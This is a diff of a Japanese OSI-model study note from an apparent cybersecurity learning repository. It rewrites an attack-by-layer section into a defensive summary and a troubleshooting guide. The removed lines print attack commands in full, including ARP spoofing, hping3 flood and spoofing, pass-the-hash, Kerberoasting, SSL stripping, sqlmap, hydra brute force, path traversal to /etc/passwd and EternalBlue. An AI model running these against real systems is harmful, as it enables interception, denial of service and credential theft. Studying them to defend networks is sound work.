-            ↓ Add MAC header + trailer                 ↑ Remove MAC frame
-
-Layer 2 — Data Link     [FRAME]           Layer 2 — Data Link
-┌──────────┬────────────────────┬──────┐  ┌──────────┬──────┬──────┐
-│MAC Header│ IP + TCP + Data    │FCS   │  │MAC Header│ Data │ FCS  │
-│src/dst MAC│                  │(CRC) │  └──────────┴──────┴──────┘
-└──────────┴────────────────────┴──────┘
-            ↓ Convert to bits                          ↑ Convert from bits
-
-Layer 1 — Physical      [BITS]            Layer 1 — Physical
-  01001000 01100101 01101100 01101100 ...   01001000 01100101 ...
-
-                    ──── Physical medium ────>
+ip route | grep default    # デフォルトゲートウェイ = ルーター
 ```
 
 ---
 
-## 10. TCPとUDPの比較
+## 7. 層ごとの攻撃と防御
 
-```bash
-# TCP connection analysis
-$ tcpdump -i eth0 'tcp and host 192.168.1.1'
+どの層も、それぞれのやり方で攻撃されうる。ここでのねらいは、**その種類の攻撃がどの層に属し、どう防ぐのか**を見分けて、適切な対策を置けるようになることだ。これは防御側のための地図であって攻撃の手引きではない。具体的なエクスプロイトのコマンドは意図的に載せておらず、ほかの教材(LC-042 ARP、LC-039 無線、Webモジュール)が概念をより深く扱う。
 
-# Wireshark filters — TCP
-# tcp.flags.syn == 1 and tcp.flags.ack == 0   → SYN (new connections)
-# tcp.flags.fin == 1                          → FIN (connection closing)
-# tcp.flags.rst == 1                          → RST (reset / port closed)
-# tcp.analysis.retransmission                 → retransmissions (packet loss)
+| 層 | 攻撃の例(それが何か) | 防御の方法 |
+|-------|-----------------------|---------------|
+| 7 Application | SQLインジェクション、XSS、リクエストフォージェリ、フィッシング: アプリ自身のロジックを悪用する | 入力検証、パッチ適用、Webアプリケーションファイアウォール |
+| 6 Presentation | TLSダウングレード / SSLストリッピング: より弱いか平文の接続を強いる | HTTPSを強制(HSTS)、最新のTLS 1.3、古い暗号方式を拒否 |
+| 5 Session | セッションハイジャック、認証情報の再送攻撃: 盗んだセッションやハッシュを使い回す | セッショントークンのローテーション、MFAの必須化、認証の堅牢化 |
+| 4 Transport | SYNフラッド、ポートスキャン、UDPフラッド: サービスを枯渇させる・探る | SYNクッキー、レート制限、ステートフルファイアウォール |
+| 3 Network | IPスプーフィング、ICMPフラッド、経路汚染: アドレスや経路を偽る | 入口フィルタリング(uRPF)、ACL、ICMPのレート制限 |
+| 2 Data Link | ARPスプーフィング、MACフラッディング、VLANホッピング: ローカルのスイッチをだます | Dynamic ARP Inspection、スイッチのポートセキュリティ |
+| 1 Physical | ケーブルの盗聴、偽の「エビルツイン」Wi-Fi、電波妨害 | 物理的なアクセス制御、常に暗号化(VPN、HTTPS) |
 
-# Wireshark filters — UDP
-# udp.port == 53     → DNS traffic
-# udp.port == 67     → DHCP server
-# udp.port == 68     → DHCP client
-
-# Test TCP vs UDP response
-$ nmap -sT 192.168.1.1 -p 80   # TCP
-$ nmap -sU 192.168.1.1 -p 53   # UDP
-
-# UDP flood detection
-$ netstat -su    # UDP statistics (errors = possible flood)
-```
-
-| 項目 | TCP | UDP |
-|------|-----|-----|
-| PDU名 | Segment | Datagram |
-| ヘッダーサイズ | 20〜60バイト | 8バイト |
-| ハンドシェイク | 3ウェイ（SYN/SYN-ACK/ACK） | なし |
-| 信頼性 | あり | なし |
-| 順序保証 | あり（シーケンス番号） | なし |
-| フロー制御 | あり（ウィンドウ制御） | なし |
-| エラー回復 | あり（再送） | なし |
-| 速度 | 遅い | 速い |
-| ブロードキャスト | 不可 | 可能 |
-| マルチキャスト | 不可 | 可能 |
-| 用途 | HTTP、SSH、FTP、SMTP | DNS、DHCP、VoIP、ゲーム |
+いちばん役立つ要点: 対策は自分の層しか守らない。第6層の暗号化は、第1層でケーブルを抜く相手には無力で、第7層のWebファイアウォールは、第2層のARPスプーフには無力だ。本物のセキュリティは、複数の層で同時に防御を積み重ねる(多層防御)。
 
 ---
 
-## 11. 主要なポート
+## 8. 層を使ったトラブルシューティング
 
-ポートはホスト内の特定のサービスやアプリケーションを識別する論理番号（0〜65535）である。3つのカテゴリがある。
-
-- Well-knownポート（0〜1023）: 標準化されており、root権限が必要
-- Registeredポート（1024〜49151）: IANAに登録済み
-- Dynamic/privateポート（49152〜65535）: 一時的に使用される
-
-```bash
-# Port scanning cheatsheet
-
-# Quick common ports scan
-$ nmap -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 target
-
-# Top 1000 ports (default nmap)
-$ nmap target
-
-# All ports
-$ nmap -p- target
-
-# Service version + OS detection + scripts
-$ nmap -sV -O -sC target
-
-# Aggressive scan (combine all)
-$ nmap -A target
-
-# Fast scan
-$ nmap -F target
-
-# Check if specific port is open with nc
-$ nc -zv target.com 22       # SSH
-$ nc -zv target.com 3389     # RDP
-$ nc -zv target.com 445      # SMB
-```
-
-### 重要ポート早見表
-
-| ポート | プロトコル | サービス | ペンテストリスク | メモ |
-|--------|-----------|----------|---------------------|------|
-| 21 | TCP | FTP | Critical | 平文、匿名ログイン |
-| 22 | TCP | SSH | High | ブルートフォース、鍵認証 |
-| 23 | TCP | Telnet | Critical | 平文、非推奨 |
-| 25 | TCP | SMTP | High | ユーザー列挙、リレー悪用 |
-| 53 | TCP/UDP | DNS | High | ゾーン転送、DNSポイズニング |
-| 67/68 | UDP | DHCP | High | 不正DHCP、starvation攻撃 |
-| 80 | TCP | HTTP | High | Web攻撃、SQLi、XSS |
-| 88 | TCP/UDP | Kerberos | Critical | AS-REP Roasting、Kerberoasting |
-| 110 | TCP | POP3 | Medium | 平文の認証情報 |
-| 111 | TCP/UDP | RPC/rpcbind | High | NFSの列挙 |
-| 135 | TCP | MS-RPC | High | DCOM攻撃 |
-| 139 | TCP | NetBIOS | High | SMB、nullセッション |
-| 143 | TCP | IMAP | Medium | 平文の認証情報 |
-| 161/162 | UDP | SNMP | High | コミュニティ文字列、情報漏洩 |
-| 389 | TCP | LDAP | High | AD列挙、nullバインド |
-| 443 | TCP | HTTPS | High | HTTPS経由のWeb攻撃 |
-| 445 | TCP | SMB | Critical | EternalBlue、pass-the-hash |
-| 512/513/514 | TCP | r-services | Critical | 認証なし、レガシー |
-| 873 | TCP | rsync | High | 未認証でのファイルアクセス |
-| 993 | TCP | IMAPS | Low | 暗号化済み |
-| 995 | TCP | POP3S | Low | 暗号化済み |
-| 1433 | TCP | MSSQL | High | SAアカウント、xp_cmdshell |
-| 1521 | TCP | Oracle DB | High | デフォルトSID |
-| 2049 | TCP/UDP | NFS | High | 未認証マウント、root squash |
-| 3306 | TCP | MySQL | High | rootにパスワードなし |
-| 3389 | TCP | RDP | Critical | BlueKeep、ブルートフォース |
-| 5432 | TCP | PostgreSQL | High | デフォルト認証情報 |
-| 5900 | TCP | VNC | High | 弱い認証または認証なし |
-| 6379 | TCP | Redis | Critical | 認証なし、設定経由のRCE |
-| 8080 | TCP | HTTP-alt | High | 開発サーバー、管理パネル |
-| 8443 | TCP | HTTPS-alt | High | 管理パネル |
-| 27017 | TCP | MongoDB | Critical | デフォルトで認証なし |
-
----
-
-## 12. 各層のプロトコル
+層は「つながらない」ときのチェックリストになる。下から始めて上へ進む。下の層が壊れていれば、その上は何も動かないからだ。
 
 ```
-┌───────────────────────────────────────────────────────────────────┐
-│ LAYER 7 — APPLICATION                                             │
-│  HTTP  HTTPS  FTP  SFTP  SSH  Telnet  DNS  DHCP  SMTP  POP3      │
-│  IMAP  SNMP  LDAP  RDP  SMB  NFS  SIP  XMPP  MQTT  Gopher       │
-├───────────────────────────────────────────────────────────────────┤
-│ LAYER 6 — PRESENTATION                                            │
-│  SSL  TLS  ASCII  Unicode  JPEG  PNG  GIF  MPEG  MIDI            │
-│  Base64  MIME  XDR  AFP  LPP                                     │
-├───────────────────────────────────────────────────────────────────┤
-│ LAYER 5 — SESSION                                                 │
-│  NetBIOS  RPC  PPTP  L2TP  SQL*Net  NFS  SMB (session mgmt)      │
-│  iSCSI  SOCKS  PAP  CHAP  Diameter                               │
-├───────────────────────────────────────────────────────────────────┤
-│ LAYER 4 — TRANSPORT                                               │
-│  TCP  UDP  SCTP  DCCP  SPX  QUIC                                 │
-├───────────────────────────────────────────────────────────────────┤
-│ LAYER 3 — NETWORK                                                 │
-│  IPv4  IPv6  ICMP  ICMPv6  OSPF  BGP  EIGRP  RIP                │
-│  IPSec  ARP*  RARP*  NAT  IGMP  GRE  MPLS                       │
-├───────────────────────────────────────────────────────────────────┤
-│ LAYER 2 — DATA LINK                                               │
-│  Ethernet  Wi-Fi (802.11)  PPP  HDLC  Frame Relay                │
-│  ATM  802.1Q (VLAN)  STP  LACP  ARP  MAC                        │
-├───────────────────────────────────────────────────────────────────┤
-│ LAYER 1 — PHYSICAL                                                │
-│  Ethernet (cable specs)  USB  DSL  ISDN  T1/E1                   │
-│  Bluetooth  802.11 (radio)  Fiber Optic standards                 │
-└───────────────────────────────────────────────────────────────────┘
+サーバーに届かない?
 
-* ARP technically operates between Layer 2 and 3
+L1 Physical:   ケーブルは挿さっている / Wi-Fiはつながっている? リンクはup?
+               ip link show eth0   → "state UP" を探す
+
+L2 Data Link:  ゲートウェイのMACは見えるか?
+               ip neigh show
+
+L3 Network:    ゲートウェイ、次に公開IPへpingできるか?
+               ping 192.168.1.1  →  ping 8.8.8.8
+               ip route show     → デフォルトルートはあるか?
+
+L4 Transport:  ポートは本当に開いているか?
+               nc -zv target 443
+
+L5/6 Session/Presentation:  TLS証明書は有効 / 期限切れでないか?
+               openssl s_client -connect target:443
+
+L7 Application: サービスは何と言っているか?
+               curl -v https://target   → ステータスコードとログを確認
 ```
 
 ---
 
-## 13. 各層のネットワーク機器
+## 9. OSI と TCP/IP モデル
 
-それぞれのネットワーク機器は、特定のOSI層で動作する。これを理解することは、ネットワークセグメンテーション、トラブルシューティング、ネットワークレベルの攻撃を扱う上で重要である。
+実際のネットワークは4層のTCP/IPモデルの上で動く。OSIの7層は次のように対応する。
 
-| OSI層 | 機器 | 機能 |
-|-------|------|------|
-| Layer 7 | アプリケーションファイアウォール、WAF、プロキシ、ロードバランサー | HTTPのフィルタリング、SSLインスペクション |
-| Layer 4 | ステートフルファイアウォール、ロードバランサー | ポートと接続によるフィルタリング |
-| Layer 3 | ルーター、L3スイッチ、ファイアウォール | ネットワーク間のルーティング |
-| Layer 2 | L2スイッチ、ブリッジ、WAP | MACベースのスイッチング |
-| Layer 1 | ハブ、リピーター、ケーブル、NIC、WAP | 物理信号の伝送 |
-
-```bash
-# Identify network devices during pentest
-
-# Identify routers / gateways
-$ ip route | grep default          # default gateway = router
-$ arp -a                           # ARP table shows local devices
-
-# Scan for specific devices
-$ nmap -sV --version-intensity 5 192.168.1.0/24
-
-# Identify switches (CDP/LLDP discovery)
-$ nmap --script lldp-discovery 192.168.1.0/24
-$ wireshark → filter: lldp or cdp
-
-# WAF detection
-$ wafw00f https://target.com
-$ nmap --script http-waf-detect --script-args="http-waf-detect.aggro" target.com
-
-# Load balancer detection
-$ lbd target.com                   # Load balancer detector
-
-# Proxy detection
-$ curl -v --proxy-header target.com  # look for Via: header
 ```
+OSIモデル                    TCP/IPモデル          例
+Layer 7 Application  ┐
+Layer 6 Presentation ├──────  Application          HTTP, DNS, SSH, TLS
+Layer 5 Session      ┘
+Layer 4 Transport    ───────  Transport            TCP, UDP
+Layer 3 Network      ───────  Internet             IP, ICMP
+Layer 2 Data Link    ┐
+Layer 1 Physical     ┴──────  Network Access       Ethernet, Wi-Fi, ARP
+```
+
+OSIは「どこで何が起きているか」を*考え、語る*ために使う。ケーブルを流れるトラフィックそのものはTCP/IPだ。
 
 ---
 
-## 14. セキュリティノート: OSI層ごとの攻撃
+## 10. クイックリファレンス
 
-OSIの各層には、それぞれ固有の攻撃ベクターがある。攻撃がどの層で発生するかを理解することは、ディフェンダーが適切なセキュリティコントロールを配置する助けになり、アタッカーが効果的な手法を選ぶ助けにもなる。
+```text
+層チートシート(上 → 下)
+  L7 Application   HTTP, DNS, SSH, SMB          (アプリが話す言葉)
+  L6 Presentation  TLS, Base64, JPEG            (書式と暗号化)
+  L5 Session       NetBIOS, RPC, SMBセッション  (会話の管理)
+  L4 Transport     TCP(確実), UDP(高速)      [ポート]
+  L3 Network       IP, ICMP, ルーティング       [IPアドレス]
+  L2 Data Link     Ethernet, ARP, VLAN          [MACアドレス]
+  L1 Physical      ケーブル, 無線, ビット        [ハードウェア]
 
-> 教育的な注記: 以下のコマンドは、自分が所有する、または許可を得たネットワークでの正規のテストを想定している。この節は攻撃のカテゴリをそれぞれが動作する層に対応付けているのであって、自分が管理していないターゲットに対する手順書ではない。
+層ごとのデータ単位
+  L7〜L5 データ → L4 セグメント/データグラム → L3 パケット → L2 フレーム → L1 ビット
 
-```bash
-# ── LAYER 1 ATTACKS ─────────────────────────────────────────────────
-
-# Physical tapping / eavesdropping
-# → Use encrypted protocols (HTTPS, SSH, VPN) to mitigate
-
-# Evil twin Wi-Fi (physical signal)
-$ airbase-ng -e "FreeWiFi" -c 6 wlan0mon
-
-# ── LAYER 2 ATTACKS ─────────────────────────────────────────────────
-
-# ARP Spoofing / Poisoning — MITM at Layer 2
-$ arpspoof -i eth0 -t 192.168.1.100 192.168.1.1     # poison victim
-$ arpspoof -i eth0 -t 192.168.1.1 192.168.1.100     # poison gateway
-$ echo 1 > /proc/sys/net/ipv4/ip_forward             # enable forwarding
-# Or use:
-$ ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//
-$ bettercap -iface eth0                               # modern MITM framework
-
-# MAC Flooding — fill switch CAM table
-$ macof -i eth0                   # flood switch with random MACs
-
-# VLAN Hopping — 802.1Q double tagging
-# Use tools like yersinia
-
-# STP Attack — become root bridge
-$ yersinia stp -attack 1 -interface eth0
-
-# ── LAYER 3 ATTACKS ─────────────────────────────────────────────────
-
-# ICMP Flood / Ping of Death
-$ hping3 -1 --flood -V -a spoofed-ip target.com
-
-# IP Spoofing
-$ hping3 -a fake-source-ip target.com
-
-# Smurf Attack (ICMP broadcast amplification)
-# BGP Hijacking (requires BGP router access)
-
-# Route poisoning
-$ python3 -c "from scapy.all import *; send(IP(dst='router',proto=89)/OSPF_Hdr()/OSPF_Hello())"
-
-# ── LAYER 4 ATTACKS ─────────────────────────────────────────────────
-
-# SYN Flood — exhaust server connections
-$ hping3 -S --flood -V -p 80 target.com
-$ hping3 -S -P -U --flood -V -p 80 target.com
-
-# Port scanning (reconnaissance)
-$ nmap -sS -p- target.com
-
-# TCP Session Hijacking
-# → Requires MITM position + sequence number prediction
-
-# UDP Flood
-$ hping3 --udp --flood target.com -p 53
-
-# ── LAYER 5 ATTACKS ─────────────────────────────────────────────────
-
-# Session Hijacking — steal session tokens
-# → Intercept cookies via HTTP (Wireshark / BetterCAP)
-
-# Pass-the-Hash (Windows NTLM)
-$ pth-winexe -U 'domain/user%aad3b435b51404eeaad3b435b51404ee:NTLM_HASH' //target cmd.exe
-$ impacket-psexec domain/user@target -hashes :NTLM_HASH
-
-# Kerberoasting (Kerberos ticket attack)
-$ impacket-GetUserSPNs domain.local/user:pass -dc-ip 192.168.1.1 -request
-
-# ── LAYER 6 ATTACKS ─────────────────────────────────────────────────
-
-# SSL Stripping — downgrade HTTPS to HTTP
-$ bettercap -iface eth0
-> set https.proxy.sslstrip true
-> https.proxy on
-
-# TLS Downgrade Attack
-$ nmap --script ssl-dh-params target.com   # check for LOGJAM
-$ nmap --script ssl-poodle target.com      # POODLE attack check
-
-# Certificate spoofing / Invalid cert bypass
-$ mitmproxy --ssl-insecure                 # intercept SSL
-$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
-
-# ── LAYER 7 ATTACKS ─────────────────────────────────────────────────
-
-# SQL Injection
-$ sqlmap -u "http://target.com/page?id=1" --dbs
-$ sqlmap -u "http://target.com/" --forms --dbs --level=5
-
-# Cross-Site Scripting (XSS)
-# Test: <script>alert(document.cookie)</script>
-
-# Directory Traversal
-$ curl "http://target.com/../../etc/passwd"
-
-# HTTP brute force
-$ hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form \
-  "/login:username=^USER^&password=^PASS^:Invalid credentials"
-
-# DNS Zone Transfer
-$ dig axfr @ns1.target.com target.com
-
-# SMTP User Enumeration
-$ smtp-user-enum -M VRFY -U users.txt -t target.com
-
-# SNMP Enumeration
-$ snmpwalk -c public -v 2c target.com
-
-# SMB Exploitation
-$ impacket-psexec administrator:password@target.com
-$ metasploit → use exploit/windows/smb/ms17_010_eternalblue
+覚え方
+  上 → 下:  All People Seem To Need Data Processing
+  下 → 上:  Please Do Not Throw Sausage Pizza Away
 ```
 
-### OSI攻撃まとめ表
+### OSI完全リファレンス表
 
-| 層 | 一般的な攻撃 | 防御策 |
-|----|--------------|--------|
-| 7 — Application | SQLi、XSS、RCE、CSRF、フィッシング | WAF、入力検証、パッチ適用 |
-| 6 — Presentation | SSLストリッピング、TLSダウングレード、証明書偽装 | HSTS、証明書ピンニング、TLS 1.3以降 |
-| 5 — Session | セッションハイジャック、pass-the-hash、Kerberoasting | トークンのローテーション、MFA、Kerberosのハードニング |
-| 4 — Transport | SYNフラッド、ポートスキャン、UDPフラッド | SYN cookie、レート制限、ファイアウォール |
-| 3 — Network | IPスプーフィング、ICMPフラッド、ルートポイズニング | uRPF、ACL、ICMPのレート制限 |
-| 2 — Data Link | ARPスプーフィング、MACフラッド、VLANホッピング | Dynamic ARP Inspection、ポートセキュリティ |
-| 1 — Physical | 盗聴、イービルツイン、電波妨害 | 物理セキュリティ、暗号化プロトコル |
+| 層 | 名前 | PDU | アドレス | 機器 | 主なプロトコル |
+|-------|------|-----|---------|-----------|----------------|
+| 7 | Application | データ | — | WAF、プロキシ | HTTP, DNS, SSH |
+| 6 | Presentation | データ | — | — | TLS, MIME |
+| 5 | Session | データ | — | — | NetBIOS, RPC |
+| 4 | Transport | セグメント / データグラム | ポート | ファイアウォール | TCP, UDP |
+| 3 | Network | パケット | IPアドレス | ルーター | IPv4, IPv6, ICMP |
+| 2 | Data Link | フレーム | MACアドレス | スイッチ | Ethernet, ARP |
+| 1 | Physical | ビット | — | ハブ, NIC | Ethernet, DSL |
 
 ---
 
-## 15. 実践的なワークフロー: ネットワーク偵察と分析
-
-```bash
-# ── SCENARIO: Network Penetration Testing — OSI-based Approach ──────
-
-# ═══ PHASE 1: LAYER 1-2 — Physical & Data Link Recon ════════════════
-
-# 1. Identify your network interface
-$ ip link show
-$ ip addr show
-
-# 2. Put interface in promiscuous mode (passive sniffing)
-$ ip link set eth0 promisc on
-$ tcpdump -i eth0 -n -e           # capture with MAC addresses
-
-# 3. ARP scan — discover all hosts on segment
-$ arp-scan --localnet             # or:
-$ nmap -sn -PR 192.168.1.0/24    # ARP ping sweep
-
-# 4. Check for ARP anomalies
-$ arpwatch -i eth0                # monitor ARP changes
-$ tcpdump -i eth0 arp             # watch ARP traffic live
-
-# ═══ PHASE 2: LAYER 3 — Network Discovery ════════════════════════════
-
-# 5. ICMP ping sweep
-$ nmap -sn 192.168.1.0/24        # host discovery
-$ fping -a -g 192.168.1.0/24 2>/dev/null
-
-# 6. TTL-based OS detection
-$ ping -c 1 target | grep ttl
-# TTL 64  → Linux/Unix
-# TTL 128 → Windows
-# TTL 255 → Network device (Cisco, etc.)
-
-# 7. Traceroute — map network topology
-$ traceroute -n 10.0.0.1
-$ mtr --report 10.0.0.1
-
-# ═══ PHASE 3: LAYER 4 — Port & Service Scanning ══════════════════════
-
-# 8. Quick port scan
-$ nmap -sS -F --open 192.168.1.0/24   # fast SYN scan, open ports only
-
-# 9. Full port scan on discovered hosts
-$ nmap -sS -p- -T4 target.com
-
-# 10. UDP scan (slow but important)
-$ nmap -sU --top-ports 100 target.com
-
-# 11. Service version detection
-$ nmap -sV -sC -p 22,80,443,445 target.com
-
-# ═══ PHASE 4: LAYER 5-6 — Session & Protocol Analysis ════════════════
-
-# 12. Check SSL/TLS configurations
-$ sslscan target.com
-$ nmap --script ssl-enum-ciphers -p 443 target.com
-$ openssl s_client -connect target.com:443
-
-# 13. Check for session management issues
-# Burp Suite → Intercept → check session tokens
-
-# 14. SMB/NetBIOS enumeration
-$ enum4linux -a target.com
-$ smbmap -H target.com
-$ smbclient -L //target.com -N
-
-# ═══ PHASE 5: LAYER 7 — Application Enumeration ══════════════════════
-
-# 15. HTTP enumeration
-$ curl -s -I http://target.com              # headers
-$ whatweb http://target.com                 # tech fingerprint
-$ nikto -h http://target.com               # web vulnerability scan
-$ gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-
-# 16. DNS enumeration
-$ dig any target.com
-$ dnsrecon -d target.com -t std
-$ fierce --domain target.com
-
-# 17. SNMP enumeration (if UDP 161 open)
-$ snmpwalk -c public -v 2c target.com
-$ snmpwalk -c public -v 2c target.com 1.3.6.1.2.1.1   # system info
-
-# 18. LDAP enumeration (if port 389 open)
-$ ldapsearch -H ldap://target.com -x -b "dc=target,dc=com"
-$ nmap --script ldap-rootdse target.com
-
-# ═══ ANALYSIS: Correlate findings across layers ═══════════════════════
-
-# 19. Full comprehensive scan
-$ nmap -A -sV -sC -O -p- --open target.com -oN full_scan.txt
-
-# 20. Parse and organize results
-$ grep "open" full_scan.txt | sort -t/ -k1 -n
-```
-
-### OSIに基づくトラブルシューティングの進め方
-
-```
-Problem: Can't reach remote server?
-
-Step 1 — Layer 1 (Physical):
-  → Is cable plugged in? Link light on?
-  $ ip link show eth0 | grep "state UP"
-
-Step 2 — Layer 2 (Data Link):
-  → Can you reach local gateway?
-  $ arp -a | grep gateway-ip
-
-Step 3 — Layer 3 (Network):
-  → Can you ping gateway?
-  $ ping 192.168.1.1
-  → Can you ping remote IP?
-  $ ping 8.8.8.8
-  → Check routing table
-  $ ip route show
-
-Step 4 — Layer 4 (Transport):
-  → Is the port open?
-  $ nc -zv target 80
-  $ nmap -p 80 target
-
-Step 5 — Layer 5-6 (Session/Presentation):
-  → SSL certificate valid?
-  $ openssl s_client -connect target:443
-  → Session timeout?
-
-Step 6 — Layer 7 (Application):
-  → HTTP response code?
-  $ curl -v http://target
-  → Application error?
-  → Check application logs
-```
-
----
-
-## OSIモデルとTCP/IPモデルの対応
-
-```
-OSI Model              TCP/IP Model (4-layer)     Protocols
-─────────────          ──────────────────────     ─────────────────────────
-Layer 7 — Application  ┐
-Layer 6 — Presentation ├── Application Layer       HTTP, FTP, DNS, SMTP, SSH
-Layer 5 — Session      ┘
-─────────────          ──────────────────────     ─────────────────────────
-Layer 4 — Transport    ─── Transport Layer         TCP, UDP, SCTP
-─────────────          ──────────────────────     ─────────────────────────
-Layer 3 — Network      ─── Internet Layer          IPv4, IPv6, ICMP, BGP
-─────────────          ──────────────────────     ─────────────────────────
-Layer 2 — Data Link    ┐
-Layer 1 — Physical     ┴── Network Access Layer    Ethernet, Wi-Fi, ARP
-```
-
----
-
-## クイックリファレンスチートシート
-
-```bash
-# ── OSI LAYER MNEMONICS ────────────────────────────────────────────
-# Top → Bottom:  "All People Seem To Need Data Processing"
-# Bottom → Top:  "Please Do Not Throw Sausage Pizza Away"
-
-# ── LAYER QUICK REFERENCE ─────────────────────────────────────────
-# L7 Application  → HTTP, DNS, FTP, SSH, SMTP, SNMP, LDAP, RDP, SMB
-# L6 Presentation → SSL/TLS, ASCII, Base64, JPEG, MIME
-# L5 Session      → NetBIOS, RPC, SMB sessions, iSCSI
-# L4 Transport    → TCP (reliable), UDP (fast)   [PORTS]
-# L3 Network      → IPv4/IPv6, ICMP, OSPF, BGP   [IP ADDRESSES]
-# L2 Data Link    → Ethernet, ARP, 802.1Q VLAN   [MAC ADDRESSES]
-# L1 Physical     → Cables, signals, bits         [HARDWARE]
-
-# ── PDU NAMES ─────────────────────────────────────────────────────
-# L7-L5: Data
-# L4:    Segment (TCP) / Datagram (UDP)
-# L3:    Packet
-# L2:    Frame
-# L1:    Bits
-
-# ── NETWORK RECON TOOLS ───────────────────────────────────────────
-arp-scan --localnet           # Layer 2 discovery
-nmap -sn 192.168.1.0/24      # Layer 3 host discovery
-nmap -sS -p- target          # Layer 4 port scan
-nmap -sV -sC target          # Layer 7 service detection
-tcpdump -i eth0 -n           # Passive capture (all layers)
-wireshark                    # GUI packet analysis
-
-# ── ATTACK TOOLS BY LAYER ─────────────────────────────────────────
-# L2: arpspoof, ettercap, bettercap, macof, yersinia
-# L3: hping3, scapy, nmap
-# L4: hping3, nmap, netcat, masscan
-# L5: impacket, mimikatz, Responder
-# L6: mitmproxy, sslstrip, sslscan, testssl.sh
-# L7: sqlmap, nikto, gobuster, hydra, burpsuite
-
-# ── DEFENSIVE TOOLS ───────────────────────────────────────────────
-# L2: arpwatch, Dynamic ARP Inspection (DAI on switches)
-# L3: uRPF, firewall ACL, fail2ban
-# L4: SYN cookies, rate limiting, stateful firewall
-# L5: Kerberos hardening, MFA, NTLM restrictions
-# L6: HSTS, cert pinning, TLS 1.3, HPKP
-# L7: WAF, input validation, CSP headers, SAST/DAST
-
-# ── WIRESHARK FILTERS CHEATSHEET ──────────────────────────────────
-ip.addr == 192.168.1.1         # filter by IP
-ip.src == 10.0.0.0/8           # filter by subnet
-tcp.port == 80                 # HTTP traffic
-tcp.flags.syn == 1             # TCP SYN packets
-tcp.flags.rst == 1             # TCP RST (port closed/reset)
-udp.port == 53                 # DNS traffic
-arp                            # ARP traffic only
-http                           # HTTP traffic only
-ssl or tls                     # SSL/TLS traffic
-dns                            # DNS only
-icmp                           # ICMP (ping) only
-!(arp or dns or icmp)          # exclude noise
-
-# ── PORT STATUS IN NMAP ────────────────────────────────────────────
-# open         → service running, accepting connections
-# closed       → port accessible, no service running (RST reply)
-# filtered     → firewall blocking, no reply
-# open|filtered → can't determine (UDP especially)
-# unfiltered   → accessible, but state unknown
-
-# ── COMMON NETWORK COMMANDS ───────────────────────────────────────
-# Linux:
-ip addr show; ip route show; ss -tulnp; arp -a; dig; traceroute
-
-# Windows:
-ipconfig /all; route print; netstat -ano; arp -a; nslookup; tracert
-```
-
----
-
-## OSI完全リファレンス表
-
-| 層 | 名称 | PDU | アドレス | 機器 | 主要プロトコル |
-|----|------|-----|---------|------|-----------------|
-| 7 | Application | Data | — | WAF、プロキシ | HTTP、FTP、DNS、SSH |
-| 6 | Presentation | Data | — | — | SSL/TLS、MIME |
-| 5 | Session | Data | — | — | NetBIOS、RPC |
-| 4 | Transport | Segment/Datagram | ポート | ファイアウォール | TCP、UDP |
-| 3 | Network | Packet | IPアドレス | ルーター | IPv4、IPv6、ICMP |
-| 2 | Data Link | Frame | MACアドレス | スイッチ | Ethernet、ARP、802.1Q |
-| 1 | Physical | Bits | — | ハブ、NIC | DSL、Ethernet |
-
----
-
-> **参考文献と書籍**
-> - James Kurose & Keith Ross『Computer Networking: A Top-Down Approach』`~/Documents/Books/CyberSec/Networking/computernetworking.pdf`
-> - William Stallings『Network Security Essentials: Applications and Standards (4th Edition)』`~/Documents/Books/CyberSec/Networking/Network-security-essentials-4th-edition-william-stallings.pdf`
-> - Matthew Gast『802.11 Wireless Networks: The Definitive Guide』`~/Documents/Books/CyberSec/Networking/802_11_Wireless_Networks__The_Definitive_Guide__O__039_Reilly_Networking_.pdf`
-> - Christian Benvenuti『Understanding Linux Network Internals』`~/Documents/Books/CyberSec/Networking/Understanding Linux Network Internals (2005).pdf`
-> - W. Richard Stevens『UNIX Network Programming (Volume 1, 3rd Edition)』`~/Documents/Books/CyberSec/Networking/UNIX Network Programming Volume 1, 3rd edition - W. Richard Stevens.pdf`
-> - RFC 793（TCP）、RFC 768（UDP）
-> - Nmap公式ドキュメント、Wireshark公式ドキュメント、IANAポート番号レジストリ
+> **参考文献・書籍対応**
+> - James Kurose & Keith Ross『Computer Networking: A Top-Down Approach』、`~/Documents/Books/CyberSec/Networking/`
+> - William Stallings『Network Security Essentials(第4版)』、`~/Documents/Books/CyberSec/Networking/`
+> - RFC 793(TCP)、RFC 768(UDP)
+> - Nmap と Wireshark の公式ドキュメント、IANAのポート番号レジストリ
 
 > **リポジトリ:** [LearnCybersecurity](https://github.com/Kodokthegr3at/LearnCybersecurity)
-> 自分が所有する、または許可を得たネットワークでの学習・検証を前提とした資料。
+> 自分が所有する、または検証を許可されたネットワークのための教育用資料とラボ。
